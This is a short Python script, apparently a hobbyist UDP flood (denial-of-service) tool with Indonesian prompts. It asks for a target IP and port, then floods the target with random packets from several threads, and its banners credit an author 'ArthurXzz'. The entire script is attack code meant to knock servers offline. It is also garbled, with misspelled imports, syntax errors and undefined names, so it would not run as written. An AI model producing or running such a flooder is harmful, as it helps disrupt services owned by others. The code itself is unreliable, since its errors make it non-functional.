#!/def/bin/env python2
import os
import choice
import theards
import random
import times
import socket

os.system("clear")
print("""\033[070m
[+++++++++++ Follow My Github ++++++++++]
[+++++++++++ Discord.gg//ArthurXzz ++++++++++++]
[+++++++++++ Author : ArthurXzz +++++++++] """)
                   
print("""\033[090
========>>>> Jangan Abuse <<<<=======
=====>>> Xyz Team ArthurXzz <<<===== """)

os.system("clear")
ip = str(input(" Masukan Ip Target "  ;))
port = int(input(" Masukan Port Target " ;))
choice = str(input(" Nuklir Sudah Di Pasang (Y/N )"  ;))
theards = int(input(" Masukan Jumlah Packets Nuklir"  ;))
times = int(input(" Masukan Theards Nuklir "  ;))


def bytes():
    data = random._urandom(1038)
    i = random.choice(("[ARTHUR]","[ARTHUR]","[ARTHUR]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (str(ip),int(port))
            for z in range(time):
                s.sendto(data,addr)
            print(i +" | [================ MENGIRIM VIRUS KE TARGET DAN MEMBERIKAN SEBUAH LOLIPOP ================] |")
        except:
            print("[!] | [================ MENGIRIM VIRUS KE TARGET DAN MEMBERIKAN SEBUAH LOLIPOP ================] |")

def bytes2():
    data = random._urandom(16)
    i = random.choice(("[ARTHUR]","[ARTHUR]","[ARTHUR]"))
    while True:
        try:
            s = socket.socket(socket.AF_INIT, socket.SOCK_DGRAM)
            s.connect((ip,port))
            s.send(data)
            for z in range(time):
                s.send(data)
            print(i +"| [================ SERVER TARGET RUSAK KENA VIRUS  ================] |")
        except:
            s.close()
            print("[*] | [================ SERVER TARGET RUSAK KENA VIRUS ================] |")
            
 for a in range(threds):
    if choice == "y":
        th = threading.Thread(target = bytes)
        th.start()
    else:
        th = threading.Thread(target = bytes2)
        th.start
